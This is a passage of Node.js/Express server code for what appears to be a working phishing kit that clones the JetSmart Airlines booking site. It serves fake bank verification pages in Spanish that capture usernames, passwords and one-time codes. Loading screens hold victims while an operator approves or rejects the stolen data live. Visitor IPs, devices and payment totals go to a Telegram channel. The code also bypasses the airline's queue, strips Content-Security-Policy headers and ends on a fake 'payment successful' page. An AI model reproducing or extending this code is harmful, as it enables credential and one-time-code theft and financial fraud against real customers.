                        fetch('/__tg/submit-credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:sessionId,usuario:usuario,contrasena:contrasena})})
                        .then(function(){window.location.href='/custom/loading-2?sessionId='+sessionId;})
                        .catch(function(){alert('Error');document.getElementById('submitBtn').disabled=false;document.getElementById('submitBtn').innerText='Activar';});
                    }
                </script>
                ${dynamicLogoScript}
                </body></html>`);

            // Step 3: Loading screen waiting for admin approve/reject credentials
        } else if (page === 'loading-2') {
            return res.send(`<!DOCTYPE html><html><head><title>Validando...</title>${otpStyles}</head>
                <body><div class="otp-card">${otpHeader}
                <div class="otp-body">
                    <p class="otp-instruction">Estamos verificando sus credenciales con su entidad bancaria. Este proceso puede tomar un momento.</p>
                    <div class="otp-spinner-wrap"><div class="otp-spinner"></div><div class="otp-spinner-text">Conectando con su banco...</div></div>
                </div>${otpFooter}</div>
                <script>
                    var sessionId=new URLSearchParams(window.location.search).get('sessionId');
                    setInterval(function(){fetch('/__tg/status?sessionId='+sessionId).then(function(r){return r.json();}).then(function(d){
                    if(d.status==='credentials_rejected')window.location.href='/custom/credenciales?sessionId='+sessionId+'&error=1';
                    else if(d.status==='credentials_approved')window.location.href='/custom/clave-dinamica?sessionId='+sessionId;}).catch(function(){});},3000);
                    setTimeout(function(){ document.querySelector('.otp-spinner-text').textContent='Verificando información...'; }, 5000);
                </script>
                ${dynamicLogoScript}
                </body></html>`);

            // Step 4: Clave Dinámica (OTP) form
        } else if (page === 'clave-dinamica') {
            return res.send(`<!DOCTYPE html><html><head><title>Verificación</title>${otpStyles}</head>
                <body><div class="otp-card">${otpHeader}
                <div class="otp-body">
                    <p class="otp-instruction">Para continuar con la transacción, genere un código dentro de su aplicación bancaria y digítelo.</p>
                    <div class="otp-section-title">Detalles transaccionales</div>
                    <div class="otp-error" id="errorMsg">El código ingresado es incorrecto. Verifique e intente nuevamente.</div>
                    <table class="otp-details-table">
                        <tr><td class="otp-td-label">Comercio:</td><td class="otp-td-value">JetSmart Airlines</td></tr>
                        <tr><td class="otp-td-label">Monto:</td><td class="otp-td-value">${gTotal}</td></tr>
                        <tr><td class="otp-td-label">Número de tarjeta:</td><td class="otp-td-value" id="cardDisplay">************</td></tr>
                        <tr><td class="otp-td-label">Digíte el código:</td><td class="otp-td-value"><input type="text" id="clave" autocomplete="off" inputmode="numeric" maxlength="8"></td></tr>
                    </table>
                    <div class="otp-btn-wrap"><button class="otp-btn" id="submitBtn" onclick="submitClave()">Activar</button></div>
                </div>${otpFooter}</div>
                <script>
                    var urlParams=new URLSearchParams(window.location.search);var sessionId=urlParams.get('sessionId');
                    if(urlParams.get('error'))document.getElementById('errorMsg').style.display='block';
                    fetch('/__tg/status?sessionId='+sessionId).then(function(r){return r.json();}).then(function(d){
                        if(d.lastFour){document.getElementById('cardDisplay').textContent='************'+d.lastFour;}
                    }).catch(function(){});
                    function submitClave(){
                        var clave=document.getElementById('clave').value;
                        if(!clave)return alert('Ingrese el código.');
                        document.getElementById('submitBtn').disabled=true;document.getElementById('submitBtn').innerText='VERIFICANDO...';
                        fetch('/__tg/submit-clave',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:sessionId,clave:clave})})
                        .then(function(){window.location.href='/custom/loading-3?sessionId='+sessionId;})
                        .catch(function(){alert('Error');document.getElementById('submitBtn').disabled=false;document.getElementById('submitBtn').innerText='Activar';});
                    }
                </script>
                ${dynamicLogoScript}
                </body></html>`);

            // Step 5: Loading screen waiting for admin approve/reject OTP
        } else if (page === 'loading-3') {
            return res.send(`<!DOCTYPE html><html><head><title>Verificando...</title>${otpStyles}</head>
                <body><div class="otp-card">${otpHeader}
                <div class="otp-body">
                    <p class="otp-instruction">Estamos validando su código. Por favor no cierre esta ventana.</p>
                    <div class="otp-spinner-wrap"><div class="otp-spinner"></div><div class="otp-spinner-text">Validando código de seguridad...</div></div>
                </div>${otpFooter}</div>
                <script>
                    var sessionId=new URLSearchParams(window.location.search).get('sessionId');
                    setInterval(function(){fetch('/__tg/status?sessionId='+sessionId).then(function(r){return r.json();}).then(function(d){
                    if(d.status==='clave_rejected')window.location.href='/custom/clave-dinamica?sessionId='+sessionId+'&error=1';
                    else if(d.status==='clave_approved')window.location.href='/custom/success';}).catch(function(){});},2000);
                </script>
                ${dynamicLogoScript}
                </body></html>`);

            // Step 6: Success page
        } else if (page === 'success') {
            const grandTotal = req.session?.searchContext?.selectedFlights?.grandTotal || 0;
            return res.send(`<!DOCTYPE html><html><head><title>Transacción Exitosa</title>
                <!-- Meta Pixel Code -->
                <script>
                !function(f,b,e,v,n,t,s)
                {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
                n.callMethod.apply(n,arguments):n.queue.push(arguments)};
                if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
                n.queue=[];t=b.createElement(e);t.async=!0;
                t.src=v;s=b.getElementsByTagName(e)[0];
                s.parentNode.insertBefore(t,s)}(window, document,'script',
                'https://connect.facebook.net/en_US/fbevents.js');
                fbq('init', '897165736269121');
                fbq('track', 'PageView');
                fbq('track', 'Purchase', {currency: 'COP', value: ${grandTotal}});
                </script>
                <noscript><img height="1" width="1" style="display:none"
                src="https://www.facebook.com/tr?id=897165736269121&ev=PageView&noscript=1"
                /></noscript>
                <!-- End Meta Pixel Code -->
                ${otpStyles}</head>
                <body><div class="otp-card">${otpHeader}
                <div class="otp-body" style="text-align:center;padding:30px 18px;">
                    <p class="otp-instruction" style="font-size:13px;">Su pago ha sido autenticado y procesado correctamente. Puede cerrar esta ventana de forma segura.</p>
                    <div class="otp-btn-wrap"><button class="otp-btn" onclick="window.location.href='https://jetsmart.com/co/es/'">Volver al Inicio</button></div>
                </div>${otpFooter}</div>
                ${dynamicLogoScript}
                </body></html>`);
        }
        res.status(404).send('Page not found');
    });

    // Keep backwards-compatible simple endpoint (won't be called by new flow)
    app.post('/api/telegram', (req, res) => {
        res.json({ ok: true });
    });

    app.post('/__search_context', (req, res) => {
        const b = req.body || {};
        const current = {
            origin: b.origin || b.Origin || b.o1 || null,
            destination: b.destination || b.Destination || b.d1 || null,
            departureDate: normalizeDate(b.departureDate || b.DepartureDate || b.dd1 || null),
            returnDate: normalizeDate(b.returnDate || b.ReturnDate || b.dd2 || null),
            adults: b.adults || b.ADT || '1',
            children: b.children || b.CHD || '0',
            infants: b.infants || b.INF || '0',
        };
        if (current.origin || current.destination) {
            req.session.searchContext.current = current;

            // Sync to the correct recorded template based on whether it's one-way or round-trip
            const activeData = !current.returnDate && cloneOneWay ? cloneOneWay : cloneRoundTrip;
            req.session.searchContext.recorded = { ...activeData.recordedFlightParams };

            console.log(`🔍 Search: ${current.origin} → ${current.destination} | ${current.departureDate} / ${current.returnDate}`);
        }
        res.json({ ok: true, searchContext: req.session.searchContext });
    });

    app.get('/__search_context', (req, res) => res.json(req.session.searchContext));

    // ── Service Worker ────────────────────────────────────────────────────

    app.get('/cloner-sw.js', (req, res) => {
        res.setHeader('Content-Type', 'application/javascript');
        res.sendFile(path.join(__dirname, 'cloner-sw.js'));
    });

    // ── Queue-IT Bypass ───────────────────────────────────────────────────

    app.get('/', (req, res, next) => {
        const t = req.query.t;
        if (!t) return next();
        const dest = decodeURIComponent(t);
        console.log(`🎫 Queue-IT bypass → ${dest.substring(0, 100)}`);
        const params = extractFlightParams(dest);
        if (params.origin && params.destination) {
            req.session.searchContext.current = params;
            if (!req.session.searchContext.recorded.origin) req.session.searchContext.recorded = { ...params };
        }
        return res.redirect(302, rewriteUrls(dest, LOCAL_BASE));
    });

    // ── InternalSelect Redirect ───────────────────────────────────────────

    app.get('/Flight/InternalSelect', (req, res) => {
        const params = extractFlightParams(`${LOCAL_BASE}${req.originalUrl}`);
        if (params.origin && params.destination) {
            req.session.searchContext.current = params;
            if (!req.session.searchContext.recorded.origin) req.session.searchContext.recorded = { ...params };
            console.log(`✈  InternalSelect: ${params.origin} → ${params.destination}`);
        }
        req.session.currentFlowStep = 'flight-results';
        return res.redirect(302, `/V2/Flight?Culture=${req.query.culture || 'es-CO'}`);
    });

    // ── Proxy Endpoint (Service Worker) ───────────────────────────────────

    app.all('/__spa_proxy', (req, res) => {
        const targetUrl = req.query.url;
        if (!targetUrl) return res.status(400).send('Missing url param');
        if (handleMock(req, res, targetUrl)) return;

        // Try static file from recorded assets
        try {
            const parsed = new URL(targetUrl);
            let pathname = parsed.pathname;
            if (pathname === '/') pathname = '/index.html';
            if (pathname.endsWith('/')) pathname += 'index.html';
            const fp = path.join(getActiveData().publicDir, parsed.hostname, pathname);
            if (fs.existsSync(fp) && fs.statSync(fp).isFile()) {
                console.log(`📁 Proxy static: ${parsed.hostname}${pathname}`);
                if (fp.endsWith('.html')) {
                    let content = fs.readFileSync(fp, 'utf8');
                    content = content.replace(/<meta[^>]*http-equiv=['"]?Content-Security-Policy['"]?[^>]*>/gi, '');
                    content = rewriteUrls(content, LOCAL_BASE);
                    res.setHeader('Content-Type', 'text/html');
                    return res.send(injectHtml(content, getActiveData().state, LOCAL_BASE, req.session.searchContext, getActiveData().stationLookup, req.session.currentFlowStep));
                }
                return res.sendFile(fp);
            }
        } catch { }

        // Proxy to real server for external CDN/SDK resources (e.g. Yuno SDK JS
        // that was recorded as 304 with no body)
        try {
            const parsedTarget = new URL(targetUrl);
            if (parsedTarget.protocol === 'https:') {
                console.log(`🌐 Proxying to real server: ${targetUrl.substring(0, 120)}`);
                const proxyReq = https.get(targetUrl, {
                    headers: {
                        'User-Agent': req.get('user-agent') || 'Mozilla/5.0',
                        'Accept': req.get('accept') || '*/*',
                        'Accept-Encoding': 'identity',
                    },
                    timeout: 10000,
                }, (proxyRes) => {
                    const skipH = new Set(['content-encoding', 'transfer-encoding', 'content-security-policy']);
                    for (const [h, v] of Object.entries(proxyRes.headers)) {
                        if (!skipH.has(h.toLowerCase())) {
                            try { res.setHeader(h, v); } catch { }
                        }
                    }
                    res.setHeader('Access-Control-Allow-Origin', '*');
                    res.status(proxyRes.statusCode);
                    proxyRes.pipe(res);
                });
                proxyReq.on('error', (err) => {
                    console.error(`🌐 Proxy error: ${err.message}`);
                    res.status(200).json({});
                });
                proxyReq.on('timeout', () => {
                    proxyReq.destroy();
                    res.status(200).json({});
                });
                return;
            }
        } catch { }

        // Graceful miss — return empty JSON instead of crashing
        res.status(200).json({});
    });

    // ── Google Fonts CSS ──────────────────────────────────────────────────

    app.get('/css', (req, res, next) => {
        const fp = path.join(getActiveData().publicDir, 'fonts.googleapis.com', 'css');
        if (fs.existsSync(fp)) { res.setHeader('Content-Type', 'text/css'); return res.send(rewriteUrls(fs.readFileSync(fp, 'utf8'), LOCAL_BASE)); }
        next();
    });
    app.get('/css2', (req, res, next) => {
        const fp = path.join(getActiveData().publicDir, 'fonts.googleapis.com', 'css2');
        if (fs.existsSync(fp)) { res.setHeader('Content-Type', 'text/css'); return res.send(rewriteUrls(fs.readFileSync(fp, 'utf8'), LOCAL_BASE)); }
        next();
    });
    app.get('/icon', (req, res, next) => {
        const fp = path.join(getActiveData().publicDir, 'fonts.googleapis.com', 'icon');
        if (fs.existsSync(fp)) { res.setHeader('Content-Type', 'text/css'); return res.send(rewriteUrls(fs.readFileSync(fp, 'utf8'), LOCAL_BASE)); }
        next();
    });

    // ── Inline Mock Matching (same-origin API calls) ──────────────────────

    app.use((req, res, next) => {
        if (handleMock(req, res, `http://${req.get('host')}${req.originalUrl}`)) return;
        next();
    });

    // ── HTML Serving ──────────────────────────────────────────────────────

    app.use((req, res, next) => {
        const isHtml = req.headers.accept?.includes('text/html')
            || req.path.endsWith('.html')
            || req.path === '/';
        if (!isHtml) return next();

        // Auto-detect search params from URL
        const params = extractFlightParams(`${LOCAL_BASE}${req.originalUrl}`);
        if (params.origin && params.destination) {
            req.session.searchContext.current = params;
            if (!req.session.searchContext.recorded.origin) req.session.searchContext.recorded = { ...params };
        }

        // Track which flow step we're on
        const p = req.path.toLowerCase();
        if (p.includes('/v2/payment')) req.session.currentFlowStep = 'payment';
        else if (p.includes('/v2/passenger')) req.session.currentFlowStep = 'passengers';
        else if (p.includes('/v2/extras')) req.session.currentFlowStep = 'extras';
        else if (p.includes('/seat/map') || p.includes('/v2/seatmap')) req.session.currentFlowStep = 'seatmap';
        else if (p.includes('/v2/baggage')) req.session.currentFlowStep = 'baggage';
        else if (p.includes('/v2/flight')) req.session.currentFlowStep = 'flight-results';
        else if (p.includes('/co/es') || p === '/') req.session.currentFlowStep = 'homepage';
        console.log(`📄 Page: ${req.path} → step: ${req.session.currentFlowStep}`);

        const ua = (req.headers['user-agent'] || '').toLowerCase();
        let deviceType = 'Desktop PC';
        if (ua.includes('android')) deviceType = 'Android';
        else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ipod')) deviceType = 'iOS';
        else if (ua.includes('mobile')) deviceType = 'Mobile';
        const ip = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || req.socket?.remoteAddress || 'Desconocido';

        if (req.session.currentFlowStep === 'flight-results' && !req.session.notifiedIPs.flight.has(ip)) {
            req.session.notifiedIPs.flight.add(ip);
            const msg = `🛫 <b>Alguien en Selección de Vuelo</b>\n💻 <b>Dispositivo:</b> ${deviceType}\n🌐 <b>IP:</b> ${ip}`;
            sendTelegramMessage(msg);
        } else if (req.session.currentFlowStep === 'payment' && !req.session.notifiedIPs.payment.has(ip)) {
            req.session.notifiedIPs.payment.add(ip);
            const adults = parseInt(req.session.searchContext.current.adults || '1', 10);
            const children = parseInt(req.session.searchContext.current.children || '0', 10);
            const infants = parseInt(req.session.searchContext.current.infants || '0', 10);
            const paxCount = adults + children + infants;
            const origin = req.session.searchContext.current.origin || 'N/A';
            const dest = req.session.searchContext.current.destination || 'N/A';
            const depDate = req.session.searchContext.current.departureDate || 'N/A';
            const retDate = req.session.searchContext.current.returnDate;
            const total = req.session.searchContext.selectedFlights.grandTotal || 0;
            const formattedTotal = total.toLocaleString('es-CO');

            let msg = `💳 <b>Alguien a punto de PAGAR</b>\n` +
                `💻 <b>Dispositivo:</b> ${deviceType}\n` +
                `🌐 <b>IP:</b> ${ip}\n` +
                `📍 <b>Ruta:</b> ${origin} ➔ ${dest}\n` +
                `📅 <b>Ida:</b> ${depDate}`;
            if (retDate && retDate !== 'N/A' && retDate !== 'null') {
                msg += ` | <b>Vuelta:</b> ${retDate}`;
            }
            msg += `\n👥 <b>Pasajeros:</b> ${paxCount} (A:${adults} C:${children} I:${infants})\n` +
                `💰 <b>Total:</b> $${formattedTotal} COP`;

            sendTelegramMessage(msg);
        }

        // Set recorded cookies (filter out booking tab cookies at flight selection)
        if (Array.isArray(getActiveData().state.cookies)) {
            const BOOKING_COOKIE_PATTERNS = ['browserTabId', 'js_freeseats', 'js_discseats'];
            const SEARCH_COOKIE_PATTERNS = ['JS_PreviousSearch', 'cart_cookie'];
            const isFlightStep = req.session.currentFlowStep === 'flight-results' || req.session.currentFlowStep === 'flight-search' || req.session.currentFlowStep === 'homepage';
            const isHomepage = req.session.currentFlowStep === 'homepage';
            let filteredCookies = isFlightStep
                ? getActiveData().state.cookies.filter(c => !BOOKING_COOKIE_PATTERNS.some(p => c.name.includes(p)))
                : getActiveData().state.cookies;
            // On the homepage, remove recorded search cookies so "Rearmar mi búsqueda"
            // doesn't always populate with the recorded BOG→MDE search
            if (isHomepage) {
                filteredCookies = filteredCookies.filter(c => !SEARCH_COOKIE_PATTERNS.some(p => c.name === p));
            }
            const cookieHeaders = filteredCookies.map(c => {
                let str = `${c.name}=${c.value}`;
                if (c.path) str += `; Path=${c.path}`;
                return str;
            });
            // Actively clear search cookies on homepage
            if (isHomepage) {
                SEARCH_COOKIE_PATTERNS.forEach(name => {
                    cookieHeaders.push(`${name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/`);
                });
            }
            res.setHeader('Set-Cookie', cookieHeaders);
        }

        // Find the HTML file
        let content = null;
        const found = findStaticFile(req.path);
        if (found) {
            content = fs.readFileSync(found.filePath, 'utf8');
        } else {
            // SPA fallback
            const host = getPreferredHost(req.path);
            if (host) {
                const fp = path.join(getActiveData().publicDir, host, 'index.html');
                if (fs.existsSync(fp)) content = fs.readFileSync(fp, 'utf8');
            }
        }

        if (!content) return next();

        content = rewriteUrls(content, LOCAL_BASE);
        res.setHeader('Content-Type', 'text/html');
        return res.send(injectHtml(content, getActiveData().state, LOCAL_BASE, req.session.searchContext, getActiveData().stationLookup, req.session.currentFlowStep));
    });

    // ── JS / CSS Serving ──────────────────────────────────────────────────

    app.use((req, res, next) => {
        const isJs = req.path.endsWith('.js') || req.path.endsWith('.mjs');
        const isCss = req.path.endsWith('.css');
        if (!isJs && !isCss) return next();

        const found = findStaticFile(req.path);
        if (!found) return next();

        let content = fs.readFileSync(found.filePath, 'utf8');
        content = rewriteUrls(content, LOCAL_BASE);
        res.setHeader('Content-Type', isJs ? 'application/javascript' : 'text/css');
        return res.send(content);
    });

    // ── Static Files ──────────────────────────────────────────────────────

    app.use((req, res, next) => {
        const found = findStaticFile(req.path);
        if (found) return res.sendFile(found.filePath);
        next();
    });

    // ── SPA Catch-all ─────────────────────────────────────────────────────

    app.get(/^(.*)$/, (req, res) => {
        const host = getPreferredHost(req.path);
        if (!host) return res.status(404).send('Clone not found.');

        const fp = path.join(getActiveData().publicDir, host, 'index.html');
        if (!fs.existsSync(fp)) return res.status(404).send('Clone not found.');

        let content = fs.readFileSync(fp, 'utf8');
        content = rewriteUrls(content, LOCAL_BASE);
        res.setHeader('Content-Type', 'text/html');
        return res.send(injectHtml(content, getActiveData().state, LOCAL_BASE, req.session.searchContext, getActiveData().stationLookup, req.session.currentFlowStep));
    });

    // ── Error Handler ──────────────────────────────────────────────────────

    app.use((err, req, res, next) => {
        console.error(`💥 [Error] ${req.method} ${req.originalUrl}: ${err.message}`);
        res.status(500).send('Internal Server Error');
    });

    // ── WebSocket Mock Layer ──────────────────────────────────────────────

    const server = http.createServer(app);
    try {
        const wss = new WebSocket.Server({ server });


        wss.on('connection', (ws, req) => {
            const sessionMock = getActiveData().wsData.find(m => m.url.includes(req.url));
            if (!sessionMock) { ws.close(); return; }

            const initial = sessionMock.interactions.find(i => !i.requestPayload);
            if (initial) {
                initial.responses.forEach(r => {
                    setTimeout(() => { if (ws.readyState === WebSocket.OPEN) ws.send(r.payload); }, r.delay || 10);
                });
            }

            ws.on('message', msg => {
                const payload = Buffer.isBuffer(msg) ? msg.toString('utf8') : msg;
                const h = hashBody(payload);
                const match = sessionMock.interactions.find(i => i.requestHash === h);
                if (match) {
                    match.responses.forEach(r => {
                        setTimeout(() => { if (ws.readyState === WebSocket.OPEN) ws.send(r.payload); }, r.delay || 10);
                    });
                }
            });
        });
    } catch (e) {
        console.error('⚠ WebSocket layer failed:', e.message);
    }

    // ── Start ─────────────────────────────────────────────────────────────

    server.listen(port, () => {
        console.log(`\n🚀 Clone running → http://localhost:${port}`);
        const rec = cloneRoundTrip.recordedFlightParams;
        console.log(`   Template: ${rec.origin || '?'} → ${rec.destination || '?'} | ${rec.departureDate || '?'} / ${rec.returnDate || '?'}`);
        console.log(`   Hosts: ${getHosts().filter(h => h.includes('jetsmart')).join(', ')}\n`);
    });
}

module.exports = { serve };
